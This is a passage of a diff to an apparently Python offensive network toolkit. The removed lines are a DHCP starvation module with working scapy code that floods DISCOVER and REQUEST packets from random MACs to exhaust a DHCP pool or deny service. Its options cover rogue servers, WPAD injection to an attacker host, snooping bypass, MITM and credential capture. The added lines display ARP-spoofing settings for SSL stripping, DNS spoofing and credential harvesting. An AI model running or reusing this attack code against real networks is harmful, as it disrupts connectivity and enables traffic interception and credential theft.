-            print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
-            self._cleanup_dhcp_starvation(config)
-            sys.exit(0)
-        
-        signal.signal(signal.SIGINT, signal_handler)
-        signal.signal(signal.SIGTERM, signal_handler)
-        
-        # Start DHCP starvation attack
-        print(f"\n{Fore.CYAN}━━━ STARTING DHCP STARVATION ATTACK ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.YELLOW}→ Interface: {config['interface']}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Attack Mode: {config['attack_mode']}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Request Count: {config['request_count']}{Style.RESET_ALL}")
-        print(f"{Fore.RED}⚠  Attack will exhaust DHCP IP pool{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}→ Press Ctrl+C to stop{Style.RESET_ALL}\n")
-        
-        # Execute attack based on mode
-        if config['attack_mode'] == 'starvation':
-            self._execute_starvation_attack(config)
-        elif config['attack_mode'] == 'dos':
-            self._execute_dos_attack(config)
-        elif config['attack_mode'] == 'rogue':
-            self._execute_rogue_server_attack(config)
-        elif config['attack_mode'] == 'hybrid':
-            self._execute_hybrid_attack(config)
-        else:
-            print(f"{Fore.RED}✗ ERROR: Invalid attack mode: {config['attack_mode']}{Style.RESET_ALL}")
-
-
-    def _load_dhcp_starvation_config(self):
-        """Load and validate DHCP starvation configuration"""
-        try:
-            config = {
-                # Core
-                'campaign_name': str(self.module_options.get('campaign_name', 'dhcp_attack')),
-                'interface': str(self.module_options.get('interface', 'eth0')),
-                'target_network': str(self.module_options.get('target_network', '192.168.1.0/24')),
-                'dhcp_server': str(self.module_options.get('dhcp_server', '')),
-                'enable_ipv6': self._parse_bool(self.module_options.get('enable_ipv6', 'false')),
-                'protocol': str(self.module_options.get('protocol', 'ipv4')),
-                
-                # Attack parameters
-                'attack_mode': str(self.module_options.get('attack_mode', 'starvation')),
-                'request_count': int(self.module_options.get('request_count', '254')),
-                'request_rate': int(self.module_options.get('request_rate', '100')),
-                'burst_mode': self._parse_bool(self.module_options.get('burst_mode', 'false')),
-                'burst_size': int(self.module_options.get('burst_size', '50')),
-                'burst_interval': int(self.module_options.get('burst_interval', '5')),
-                'continuous_mode': self._parse_bool(self.module_options.get('continuous_mode', 'false')),
-                'attack_duration': int(self.module_options.get('attack_duration', '300')),
-                
-                # MAC generation
-                'mac_generation': str(self.module_options.get('mac_generation', 'random')),
-                'mac_prefix': str(self.module_options.get('mac_prefix', '')),
-                'mac_vendor': str(self.module_options.get('mac_vendor', 'cisco')),
-                'mac_pool_size': int(self.module_options.get('mac_pool_size', '1000')),
-                'mac_reuse': self._parse_bool(self.module_options.get('mac_reuse', 'false')),
-                'mac_randomization': self._parse_bool(self.module_options.get('mac_randomization', 'true')),
-                
-                # DHCP options
-                'hostname_pattern': str(self.module_options.get('hostname_pattern', 'client-{id}')),
-                'client_id_generation': str(self.module_options.get('client_id_generation', 'random')),
-                'vendor_class': str(self.module_options.get('vendor_class', 'MSFT 5.0')),
-                'request_options': str(self.module_options.get('request_options', '1,3,6,15,28,33,42,51,58,59')),
-                'parameter_request_list': self._parse_bool(self.module_options.get('parameter_request_list', 'true')),
-                'broadcast_flag': self._parse_bool(self.module_options.get('broadcast_flag', 'true')),
-                'unicast_responses': self._parse_bool(self.module_options.get('unicast_responses', 'false')),
-                
-                # Lease management
-                'lease_duration': int(self.module_options.get('lease_duration', '3600')),
-                'release_after_offer': self._parse_bool(self.module_options.get('release_after_offer', 'false')),
-                'decline_offers': self._parse_bool(self.module_options.get('decline_offers', 'false')),
-                'accept_all_offers': self._parse_bool(self.module_options.get('accept_all_offers', 'true')),
-                'track_leases': self._parse_bool(self.module_options.get('track_leases', 'true')),
-                'lease_renewal': self._parse_bool(self.module_options.get('lease_renewal', 'false')),
-                'renewal_interval': int(self.module_options.get('renewal_interval', '1800')),
-                
-                # Rogue server
-                'deploy_rogue_server': self._parse_bool(self.module_options.get('deploy_rogue_server', 'false')),
-                'rogue_server_ip': str(self.module_options.get('rogue_server_ip', '192.168.1.250')),
-                'rogue_ip_range_start': str(self.module_options.get('rogue_ip_range_start', '192.168.1.100')),
-                'rogue_ip_range_end': str(self.module_options.get('rogue_ip_range_end', '192.168.1.200')),
-                'rogue_gateway': str(self.module_options.get('rogue_gateway', '192.168.1.1')),
-                'rogue_dns': str(self.module_options.get('rogue_dns', '8.8.8.8,1.1.1.1')),
-                'rogue_subnet_mask': str(self.module_options.get('rogue_subnet_mask', '255.255.255.0')),
-                'rogue_lease_time': int(self.module_options.get('rogue_lease_time', '86400')),
-                'rogue_domain_name': str(self.module_options.get('rogue_domain_name', 'attacker.local')),
-                
-                # Attack enhancement
-                'dhcp_flooding': self._parse_bool(self.module_options.get('dhcp_flooding', 'false')),
-                'discover_flood': self._parse_bool(self.module_options.get('discover_flood', 'false')),
-                'request_flood': self._parse_bool(self.module_options.get('request_flood', 'false')),
-                'release_flood': self._parse_bool(self.module_options.get('release_flood', 'false')),
-                'decline_flood': self._parse_bool(self.module_options.get('decline_flood', 'false')),
-                'inform_flood': self._parse_bool(self.module_options.get('inform_flood', 'false')),
-                'nak_injection': self._parse_bool(self.module_options.get('nak_injection', 'false')),
-                'malformed_packets': self._parse_bool(self.module_options.get('malformed_packets', 'false')),
-                
-                # Network disruption
-                'gateway_override': self._parse_bool(self.module_options.get('gateway_override', 'false')),
-                'gateway_redirect': str(self.module_options.get('gateway_redirect', '')),
-                'dns_override': self._parse_bool(self.module_options.get('dns_override', 'false')),
-                'dns_redirect': str(self.module_options.get('dns_redirect', '')),
-                'route_injection': self._parse_bool(self.module_options.get('route_injection', 'false')),
-                'malicious_routes': str(self.module_options.get('malicious_routes', '')),
-                'wpad_injection': self._parse_bool(self.module_options.get('wpad_injection', 'false')),
-                'wpad_url': str(self.module_options.get('wpad_url', 'http://attacker.com/wpad.dat')),
-                
-                # Response handling
-                'capture_offers': self._parse_bool(self.module_options.get('capture_offers', 'true')),
-                'capture_acks': self._parse_bool(self.module_options.get('capture_acks', 'true')),
-                'capture_naks': self._parse_bool(self.module_options.get('capture_naks', 'true')),
-                'analyze_responses': self._parse_bool(self.module_options.get('analyze_responses', 'true')),
-                'fingerprint_server': self._parse_bool(self.module_options.get('fingerprint_server', 'true')),
-                'detect_failover': self._parse_bool(self.module_options.get('detect_failover', 'false')),
-                'monitor_pool_exhaustion': self._parse_bool(self.module_options.get('monitor_pool_exhaustion', 'true')),
-                
-                # Traffic analysis
-                'packet_capture': self._parse_bool(self.module_options.get('packet_capture', 'true')),
-                'pcap_output': str(self.module_options.get('pcap_output', 'dhcp_capture.pcap')),
-                'log_all_dhcp': self._parse_bool(self.module_options.get('log_all_dhcp', 'true')),
-                'track_server_responses': self._parse_bool(self.module_options.get('track_server_responses', 'true')),
-                'identify_dhcp_servers': self._parse_bool(self.module_options.get('identify_dhcp_servers', 'true')),
-                'map_network': self._parse_bool(self.module_options.get('map_network', 'false')),
-                'detect_rogue_servers': self._parse_bool(self.module_options.get('detect_rogue_servers', 'false')),
-                
-                # Timing
-                'threads': int(self.module_options.get('threads', '4')),
-                'queue_size': int(self.module_options.get('queue_size', '1000')),
-                'timeout': int(self.module_options.get('timeout', '10')),
-                'retry_attempts': int(self.module_options.get('retry_attempts', '3')),
-                'retry_delay': int(self.module_options.get('retry_delay', '2')),
-                'rate_limit': int(self.module_options.get('rate_limit', '100')),
-                'adaptive_timing': self._parse_bool(self.module_options.get('adaptive_timing', 'false')),
-                'smart_throttling': self._parse_bool(self.module_options.get('smart_throttling', 'false')),
-                
-                # Evasion
-                'stealth_mode': self._parse_bool(self.module_options.get('stealth_mode', 'false')),
-                'randomize_timing': self._parse_bool(self.module_options.get('randomize_timing', 'false')),
-                'jitter': self._parse_bool(self.module_options.get('jitter', 'false')),
-                'jitter_range': int(self.module_options.get('jitter_range', '1000')),
-                'mimic_legitimate': self._parse_bool(self.module_options.get('mimic_legitimate', 'false')),
-                'avoid_detection': self._parse_bool(self.module_options.get('avoid_detection', 'false')),
-                'gradual_escalation': self._parse_bool(self.module_options.get('gradual_escalation', 'false')),
-                'escalation_rate': int(self.module_options.get('escalation_rate', '10')),
-                
-                # Target selection
-                'target_specific_server': self._parse_bool(self.module_options.get('target_specific_server', 'false')),
-                'server_mac': str(self.module_options.get('server_mac', '')),
-                'server_ip': str(self.module_options.get('server_ip', '')),
-                'ignore_other_servers': self._parse_bool(self.module_options.get('ignore_other_servers', 'false')),
-                'prefer_ipv6': self._parse_bool(self.module_options.get('prefer_ipv6', 'false')),
-                'target_vlan': str(self.module_options.get('target_vlan', '')),
-                
-                # Database
-                'enable_database': self._parse_bool(self.module_options.get('enable_database', 'true')),
-                'db_file': str(self.module_options.get('db_file', 'dhcp_starvation.db')),
-                'log_file': str(self.module_options.get('log_file', 'dhcp_starvation.log')),
-                'log_level': str(self.module_options.get('log_level', 'info')),
-                'log_format': str(self.module_options.get('log_format', 'detailed')),
-                'log_rotation': self._parse_bool(self.module_options.get('log_rotation', 'true')),
-                'max_log_size': int(self.module_options.get('max_log_size', '100')),
-                'log_timestamp': self._parse_bool(self.module_options.get('log_timestamp', 'true')),
-                
-                # Reporting
-                'generate_report': self._parse_bool(self.module_options.get('generate_report', 'true')),
-                'report_format': str(self.module_options.get('report_format', 'all')),
-                'report_interval': int(self.module_options.get('report_interval', '60')),
-                'include_statistics': self._parse_bool(self.module_options.get('include_statistics', 'true')),
-                'include_server_info': self._parse_bool(self.module_options.get('include_server_info', 'true')),
-                'include_lease_table': self._parse_bool(self.module_options.get('include_lease_table', 'true')),
-                'include_timeline': self._parse_bool(self.module_options.get('include_timeline', 'true')),
-                'visualize_data': self._parse_bool(self.module_options.get('visualize_data', 'false')),
-                'export_to_csv': self._parse_bool(self.module_options.get('export_to_csv', 'false')),
-                
-                # Notifications
-                'enable_alerts': self._parse_bool(self.module_options.get('enable_alerts', 'true')),
-                'alert_on_success': self._parse_bool(self.module_options.get('alert_on_success', 'true')),
-                'alert_on_exhaustion': self._parse_bool(self.module_options.get('alert_on_exhaustion', 'true')),
-                'alert_on_server_down': self._parse_bool(self.module_options.get('alert_on_server_down', 'false')),
-                'alert_method': str(self.module_options.get('alert_method', 'console')),
-                'webhook_url': str(self.module_options.get('webhook_url', '')),
-                'email_to': str(self.module_options.get('email_to', '')),
-                'syslog_server': str(self.module_options.get('syslog_server', '')),
-                'alert_threshold': int(self.module_options.get('alert_threshold', '90')),
-                
-                # Recovery
-                'release_on_exit': self._parse_bool(self.module_options.get('release_on_exit', 'true')),
-                'restore_network': self._parse_bool(self.module_options.get('restore_network', 'false')),
-                'cleanup_leases': self._parse_bool(self.module_options.get('cleanup_leases', 'true')),
-                'stop_rogue_server': self._parse_bool(self.module_options.get('stop_rogue_server', 'true')),
-                'flush_arp_cache': self._parse_bool(self.module_options.get('flush_arp_cache', 'false')),
-                'reset_interface': self._parse_bool(self.module_options.get('reset_interface', 'false')),
-                
-                # Safety
-                'dry_run': self._parse_bool(self.module_options.get('dry_run', 'false')),
-                'test_mode': self._parse_bool(self.module_options.get('test_mode', 'false')),
-                'interactive': self._parse_bool(self.module_options.get('interactive', 'false')),
-                'confirm_attack': self._parse_bool(self.module_options.get('confirm_attack', 'true')),
-                'max_requests': int(self.module_options.get('max_requests', '1000')),
-                'auto_stop_timer': int(self.module_options.get('auto_stop_timer', '600')),
-                'emergency_stop': self._parse_bool(self.module_options.get('emergency_stop', 'true')),
-                'safe_mode': self._parse_bool(self.module_options.get('safe_mode', 'false')),
-                
-                # Advanced
-                'dhcp_snooping_bypass': self._parse_bool(self.module_options.get('dhcp_snooping_bypass', 'false')),
-                'vlan_hopping': self._parse_bool(self.module_options.get('vlan_hopping', 'false')),
-                'option_82_injection': self._parse_bool(self.module_options.get('option_82_injection', 'false')),
-                'relay_agent_spoofing': self._parse_bool(self.module_options.get('relay_agent_spoofing', 'false')),
-                'giaddr_manipulation': self._parse_bool(self.module_options.get('giaddr_manipulation', 'false')),
-                'bootfile_injection': self._parse_bool(self.module_options.get('bootfile_injection', 'false')),
-                'bootfile_url': str(self.module_options.get('bootfile_url', '')),
-                'tftp_server': str(self.module_options.get('tftp_server', '')),
-                
-                # Post-attack
-                'deploy_mitm': self._parse_bool(self.module_options.get('deploy_mitm', 'false')),
-                'enable_arp_spoof': self._parse_bool(self.module_options.get('enable_arp_spoof', 'false')),
-                'deploy_dns_spoof': self._parse_bool(self.module_options.get('deploy_dns_spoof', 'false')),
-                'capture_credentials': self._parse_bool(self.module_options.get('capture_credentials', 'false')),
-                'proxy_traffic': self._parse_bool(self.module_options.get('proxy_traffic', 'false')),
-                'maintain_persistence': self._parse_bool(self.module_options.get('maintain_persistence', 'false'))
-            }
+    
+        def _display_arp_spoof_config(self, config):
+            """Display ARP spoof configuration"""
+            from colorama import Fore, Style
             
-            return config
-        except Exception as e:
-            print(f"Error loading config: {str(e)}")
-            return None
-
-
-    def _display_dhcp_starvation_config(self, config):
-        """Display DHCP starvation configuration"""
-        from colorama import Fore, Style
-        
-        print(f"{Fore.CYAN}{'=' * 70}")
-        print(f"  CONFIGURATION")
-        print(f"{'=' * 70}{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW}  Campaign:{Style.RESET_ALL}")
-        print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
-        print(f"    • Interface:       {Fore.WHITE}{config['interface']}{Style.RESET_ALL}")
-        print(f"    • Target Network:  {Fore.WHITE}{config['target_network']}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Attack:{Style.RESET_ALL}")
-        print(f"    • Mode:            {Fore.WHITE}{config['attack_mode']}{Style.RESET_ALL}")
-        print(f"    • Request Count:   {Fore.WHITE}{config['request_count']}{Style.RESET_ALL}")
-        print(f"    • Request Rate:    {Fore.WHITE}{config['request_rate']} req/s{Style.RESET_ALL}")
-        print(f"    • Continuous:      {Fore.GREEN if config['continuous_mode'] else Fore.RED}{'✓' if config['continuous_mode'] else '✗'}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  MAC Generation:{Style.RESET_ALL}")
-        print(f"    • Strategy:        {Fore.WHITE}{config['mac_generation']}{Style.RESET_ALL}")
-        print(f"    • Pool Size:       {Fore.WHITE}{config['mac_pool_size']}{Style.RESET_ALL}")
-        print(f"    • Randomization:   {Fore.GREEN if config['mac_randomization'] else Fore.RED}{'✓' if config['mac_randomization'] else '✗'}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Rogue Server:{Style.RESET_ALL}")
-        print(f"    • Deploy:          {Fore.GREEN if config['deploy_rogue_server'] else Fore.RED}{'✓' if config['deploy_rogue_server'] else '✗'}{Style.RESET_ALL}")
-        if config['deploy_rogue_server']:
-            print(f"    • Server IP:       {Fore.WHITE}{config['rogue_server_ip']}{Style.RESET_ALL}")
-            print(f"    • IP Range:        {Fore.WHITE}{config['rogue_ip_range_start']} - {config['rogue_ip_range_end']}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Database:{Style.RESET_ALL}")
-        print(f"    • Enabled:         {Fore.GREEN if config['enable_database'] else Fore.RED}{'✓' if config['enable_database'] else '✗'}{Style.RESET_ALL}")
-        if config['enable_database']:
-            print(f"    • DB File:         {Fore.WHITE}{config['db_file']}{Style.RESET_ALL}")
-        
-        print()
-
-
-    def _initialize_dhcp_database(self, config):
-        """Initialize SQLite database for DHCP operations"""
-        import sqlite3
-        
-        conn = sqlite3.connect(config['db_file'])
-        cursor = conn.cursor()
-        
-        # Campaigns table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS campaigns (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                name TEXT NOT NULL,
-                interface TEXT,
-                target_network TEXT,
-                attack_mode TEXT,
-                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                end_time TIMESTAMP,
-                requests_sent INTEGER DEFAULT 0,
-                offers_received INTEGER DEFAULT 0,
-                acks_received INTEGER DEFAULT 0,
-                leases_acquired INTEGER DEFAULT 0,
-                pool_exhausted BOOLEAN DEFAULT 0,
-                status TEXT DEFAULT 'active'
-            )
-        ''')
-        
-        # DHCP requests table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS dhcp_requests (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                mac_address TEXT,
-                hostname TEXT,
-                transaction_id TEXT,
-                request_type TEXT,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # DHCP responses table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS dhcp_responses (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                server_ip TEXT,
-                offered_ip TEXT,
-                mac_address TEXT,
-                response_type TEXT,
-                lease_time INTEGER,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # Leases table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS leases (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                mac_address TEXT,
-                ip_address TEXT,
-                server_ip TEXT,
-                lease_time INTEGER,
-                acquired_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                expires_at TIMESTAMP,
-                released BOOLEAN DEFAULT 0,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # DHCP servers table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS dhcp_servers (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                server_ip TEXT,
-                server_mac TEXT,
-                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                last_seen TIMESTAMP,
-                offers_count INTEGER DEFAULT 0,
-                fingerprint TEXT,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # Insert campaign record
-        cursor.execute('''
-            INSERT INTO campaigns (name, interface, target_network, attack_mode)
-            VALUES (?, ?, ?, ?)
-        ''', (config['campaign_name'], config['interface'], config['target_network'], config['attack_mode']))
-        
-        conn.commit()
-        conn.close()
-
-
-    def _detect_dhcp_server(self, config):
-        """Detect DHCP server by sending discovery packet"""
-        from scapy.all import BOOTP, DHCP, Ether, IP, UDP, RandMAC, srp
-        import time
-        
-        try:
-            # Craft DHCP discover packet
-            discover = (
-                Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
-                IP(src="0.0.0.0", dst="255.255.255.255") /
-                UDP(sport=68, dport=67) /
-                BOOTP(chaddr=RandMAC()) /
-                DHCP(options=[("message-type", "discover"), "end"])
-            )
+            print(f"{Fore.CYAN}{'=' * 70}")
+            print(f"  CONFIGURATION")
+            print(f"{'=' * 70}{Style.RESET_ALL}\n")
             
-            # Send and receive
-            answered, unanswered = srp(discover, iface=config['interface'], timeout=5, verbose=False)
+            print(f"{Fore.YELLOW}  Campaign:{Style.RESET_ALL}")
+            print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
+            print(f"    • Interface:       {Fore.WHITE}{config['interface']}{Style.RESET_ALL}")
+            print(f"    • Mode:            {Fore.WHITE}{config['mode']}{Style.RESET_ALL}")
             
-            if answered:
-                for sent, received in answered:
-                    if DHCP in received:
-                        return received[IP].src
+            print(f"\n{Fore.YELLOW}  Targets:{Style.RESET_ALL}")
+            print(f"    • Target IP:       {Fore.WHITE}{config['target_ip']}{Style.RESET_ALL}")
+            print(f"    • Gateway IP:      {Fore.WHITE}{config['gateway_ip']}{Style.RESET_ALL}")
             
-            return None
-        except Exception as e:
-            return None
-
-
-    def _execute_starvation_attack(self, config):
-        """Execute DHCP starvation attack"""
-        from scapy.all import BOOTP, DHCP, Ether, IP, UDP, RandMAC, sendp
-        from colorama import Fore, Style
-        import time
-        import random
-        
-        print(f"{Fore.CYAN}━━━ DHCP STARVATION MODE ━━━{Style.RESET_ALL}\n")
-        
-        request_count = 0
-        offers_received = 0
-        acks_received = 0
-        leases = []
-        start_time = time.time()
-        
-        try:
-            for i in range(config['request_count']):
-                # Generate unique MAC address
-                if config['mac_generation'] == 'random':
-                    mac = RandMAC()
-                elif config['mac_generation'] == 'sequential':
-                    mac = f"00:11:22:33:{i//256:02x}:{i%256:02x}"
-                else:
-                    mac = RandMAC()
-                
-                # Generate hostname
-                hostname = config['hostname_pattern'].replace('{id}', str(i))
-                
-                # Craft DHCP DISCOVER
-                discover = (
-                    Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-                    IP(src="0.0.0.0", dst="255.255.255.255") /
-                    UDP(sport=68, dport=67) /
-                    BOOTP(chaddr=mac, xid=random.randint(1, 0xFFFFFFFF)) /
-                    DHCP(options=[
-                        ("message-type", "discover"),
-                        ("hostname", hostname),
-                        ("param_req_list", [1, 3, 6, 15]),
-                        "end"
-                    ])
-                )
-                
-                # Send packet
-                sendp(discover, iface=config['interface'], verbose=False)
-                request_count += 1
-                
-                # Log to database
-                if config['enable_database']:
-                    self._log_dhcp_request(config, str(mac), hostname, 'discover')
-                
-                # Display progress
-                if request_count % 10 == 0:
-                    elapsed = int(time.time() - start_time)
-                    print(f"\r{Fore.CYAN}[{elapsed}s] Requests: {request_count} | Offers: {offers_received} | Leases: {len(leases)}{Style.RESET_ALL}", end='', flush=True)
-                
-                # Rate limiting
-                if config['rate_limit'] > 0:
-                    time.sleep(1.0 / config['rate_limit'])
-                
-                # Check max requests
-                if config['max_requests'] > 0 and request_count >= config['max_requests']:
-                    break
-                
-                # Check emergency stop
-                if config['emergency_stop']:
-                    # Check for emergency stop conditions (e.g., pool 95% exhausted)
-                    success_rate = (len(leases) / request_count * 100) if request_count > 0 else 0
-                    if success_rate >= 95:
-                        print(f"\n\n{Fore.RED}⚠  EMERGENCY STOP: Pool 95% exhausted{Style.RESET_ALL}")
-                        self._emergency_stop_handler(config)
-                        break
-                
-                # Check auto-stop timer
-                if config['auto_stop_timer'] > 0 and (time.time() - start_time) >= config['auto_stop_timer']:
-                    break
-        
-        except KeyboardInterrupt as e:
-            # Silently handle KeyboardInterrupt
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] KeyboardInterrupt: {e}")
-        
-        print(f"\n\n{Fore.YELLOW}━━━ ATTACK COMPLETED ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.GREEN}→ Requests Sent: {request_count}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}→ Leases Acquired: {len(leases)}{Style.RESET_ALL}")
-        
-        if len(leases) >= config['request_count'] * 0.9:
-            print(f"{Fore.RED}⚠  DHCP POOL LIKELY EXHAUSTED!{Style.RESET_ALL}")
-
-
-    def _execute_dos_attack(self, config):
-        """Execute DHCP DoS attack"""
-        from scapy.all import BOOTP, DHCP, Ether, IP, UDP, RandMAC, sendp
-        from colorama import Fore, Style
-        import time
-        import random
-        
-        print(f"{Fore.CYAN}━━━ DHCP DOS MODE ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.RED}⚠  Flooding DHCP server with requests...{Style.RESET_ALL}\n")
-        
-        request_count = 0
-        start_time = time.time()
-        
-        try:
-            while True:
-                # Rapid fire DHCP packets
-                for _ in range(config['burst_size']):
-                    mac = RandMAC()
-                    
-                    if config['discover_flood']:
-                        packet = (
-                            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-                            IP(src="0.0.0.0", dst="255.255.255.255") /
-                            UDP(sport=68, dport=67) /
-                            BOOTP(chaddr=mac, xid=random.randint(1, 0xFFFFFFFF)) /
-                            DHCP(options=[("message-type", "discover"), "end"])
-                        )
-                        sendp(packet, iface=config['interface'], verbose=False)
-                        request_count += 1
-                    
-                    if config['request_flood']:
-                        packet = (
-                            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-                            IP(src="0.0.0.0", dst="255.255.255.255") /
-                            UDP(sport=68, dport=67) /
-                            BOOTP(chaddr=mac, xid=random.randint(1, 0xFFFFFFFF)) /
-                            DHCP(options=[("message-type", "request"), ("requested_addr", "192.168.1.100"), "end"])
-                        )
-                        sendp(packet, iface=config['interface'], verbose=False)
-                        request_count += 1
-                
-                elapsed = int(time.time() - start_time)
-                print(f"\r{Fore.RED}[{elapsed}s] DoS Packets Sent: {request_count}{Style.RESET_ALL}", end='', flush=True)
-                
-                time.sleep(config['burst_interval'] / 1000.0)
-                
-                if config['auto_stop_timer'] > 0 and elapsed >= config['auto_stop_timer']:
-                    break
-        
-        except KeyboardInterrupt as e:
-            # Silently handle KeyboardInterrupt
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] KeyboardInterrupt: {e}")
-        
-        print(f"\n\n{Fore.YELLOW}━━━ DOS ATTACK COMPLETED ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.GREEN}→ DoS Packets Sent: {request_count}{Style.RESET_ALL}")
-
-
-    def _execute_rogue_server_attack(self, config):
-        """Execute rogue DHCP server attack"""
-        from colorama import Fore, Style
-        
-        print(f"{Fore.CYAN}━━━ ROGUE DHCP SERVER MODE ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.YELLOW}→ Deploying rogue DHCP server on {config['interface']}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ IP Range: {config['rogue_ip_range_start']} - {config['rogue_ip_range_end']}{Style.RESET_ALL}")
-        print(f"{Fore.RED}⚠  Rogue server will respond to all DHCP requests{Style.RESET_ALL}\n")
-        print(f"{Fore.BLUE}ℹ  Rogue server implementation requires additional libraries{Style.RESET_ALL}")
-        print(f"{Fore.BLUE}ℹ  Use mode 'starvation' for IP pool exhaustion{Style.RESET_ALL}")
-
-
-    def _execute_hybrid_attack(self, config):
-        """Execute hybrid attack (starvation + rogue server)"""
-        from colorama import Fore, Style
-        
-        print(f"{Fore.CYAN}━━━ HYBRID ATTACK MODE ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.YELLOW}→ Phase 1: Exhausting DHCP pool{Style.RESET_ALL}\n")
-        
-        # Execute starvation first
-        self._execute_starvation_attack(config)
-        
-        print(f"\n{Fore.YELLOW}→ Phase 2: Would deploy rogue DHCP server{Style.RESET_ALL}")
-        print(f"{Fore.BLUE}ℹ  Rogue server deployment not implemented{Style.RESET_ALL}")
-
-
-    def _log_dhcp_request(self, config, mac, hostname, request_type):
-        """Log DHCP request to database"""
-        import sqlite3
-        try:
+            print(f"\n{Fore.YELLOW}  ARP Poisoning:{Style.RESET_ALL}")
+            print(f"    • Interval:        {Fore.WHITE}{config['poison_interval']}s{Style.RESET_ALL}")
+            print(f"    • Restore on exit: {Fore.GREEN if config['restore_arp'] else Fore.RED}{'✓' if config['restore_arp'] else '✗'}{Style.RESET_ALL}")
+            print(f"    • IP Forward:      {Fore.GREEN if config['enable_ip_forward'] else Fore.RED}{'✓' if config['enable_ip_forward'] else '✗'}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  MITM Attacks:{Style.RESET_ALL}")
+            print(f"    • Packet Capture:  {Fore.GREEN if config['enable_packet_capture'] else Fore.RED}{'✓' if config['enable_packet_capture'] else '✗'}{Style.RESET_ALL}")
+            print(f"    • SSL Strip:       {Fore.GREEN if config['enable_ssl_strip'] else Fore.RED}{'✓' if config['enable_ssl_strip'] else '✗'}{Style.RESET_ALL}")
+            print(f"    • DNS Spoof:       {Fore.GREEN if config['enable_dns_spoof'] else Fore.RED}{'✓' if config['enable_dns_spoof'] else '✗'}{Style.RESET_ALL}")
+            print(f"    • Credential Harvest: {Fore.GREEN if config['enable_credential_harvest'] else Fore.RED}{'✓' if config['enable_credential_harvest'] else '✗'}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Harvesting:{Style.RESET_ALL}")
+            protocols = []
+            if config['harvest_http']: protocols.append('HTTP')
+            if config['harvest_ftp']: protocols.append('FTP')
+            if config['harvest_smtp']: protocols.append('SMTP')
+            if config['harvest_telnet']: protocols.append('Telnet')
+            print(f"    • Protocols:       {Fore.WHITE}{', '.join(protocols) if protocols else 'None'}{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.YELLOW}  Database:{Style.RESET_ALL}")
+            print(f"    • Enabled:         {Fore.GREEN if config['enable_database'] else Fore.RED}{'✓' if config['enable_database'] else '✗'}{Style.RESET_ALL}")
+            if config['enable_database']:
+                print(f"    • DB File:         {Fore.WHITE}{config['db_file']}{Style.RESET_ALL}")
+            
+            print()
+    
+    
+        def _initialize_mitm_database(self, config):
+            """Initialize SQLite database for MITM operations"""
+            import sqlite3
+            
             conn = sqlite3.connect(config['db_file'])
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO dhcp_requests (campaign_id, mac_address, hostname, request_type)
-                VALUES (1, ?, ?, ?)
-            ''', (mac, hostname, request_type))
-            
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _cleanup_dhcp_starvation(self, config):
-        """Cleanup and generate reports"""
-        from colorama import Fore, Style
-        
-        print(f"{Fore.CYAN}→ Cleaning up...{Style.RESET_ALL}")
-        
-        # Release leases if configured
-        if config['release_on_exit']:
-            print(f"{Fore.CYAN}→ Releasing acquired leases...{Style.RESET_ALL}")
-        
-        # Generate final report
-        if config['generate_report']:
-            print(f"{Fore.CYAN}→ Generating final report...{Style.RESET_ALL}")
-            self._generate_dhcp_report(config)
